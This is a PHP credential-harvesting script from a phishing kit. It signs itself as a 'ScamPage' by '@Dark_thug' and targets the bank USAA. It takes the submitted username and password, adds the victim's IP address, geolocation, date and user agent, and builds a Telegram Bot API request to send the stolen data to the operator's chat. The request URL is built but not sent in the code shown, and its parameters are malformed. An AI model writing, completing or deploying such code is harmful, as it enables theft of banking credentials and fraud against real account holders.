﻿<?php
require_once('geoplugin.class.php');
$UserAgent = $_SERVER['HTTP_USER_AGENT'];
$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$Email = $_POST['j_username'];
$Password = $_POST['j_password'];
$TelegramBOTToken = 'YourTelegramBOTToken'; //Make BOT Using BOTFather and ChatHim First Just Send /start is Engouh
$RezultTo = '606847110'; //@Dark_thug ChatID
$Message = '---USAA---';
$Message .= 'New Rezult 🥳\n';
$Message .= '😍Email:'.$Email.'\n';
$Message .= '🥰Password:'.$Password.'\n';
$Message .= '---GeoLocation---';
$Message .= "IP Address: ".$ip."\n";
$Message .= "City: {$geoplugin->city}\n";
$Message .= "Region: {$geoplugin->region}\n";
$Message .= "Country Name: {$geoplugin->countryName}\n";
$Message .= "Country Code: {$geoplugin->countryCode}\n";
$Message .= "Date: ".$adddate."\n";
$Message .= '---User-Agent---';
$Message .= 'UserAgent: '.$UserAgent.'\n';
$Message .= '---ScamPage-Programmer---';
$Message .= 'Telegram : @Dark_thug';
$Message .= 'WITH LOVE ❤️ By @Dark_thug';
$API = 'https://api.telegram.org/bot'.$TelegramBOTToken.'/sendMessage?chat_id'.$RezultTo.'&text'.$Message;
?>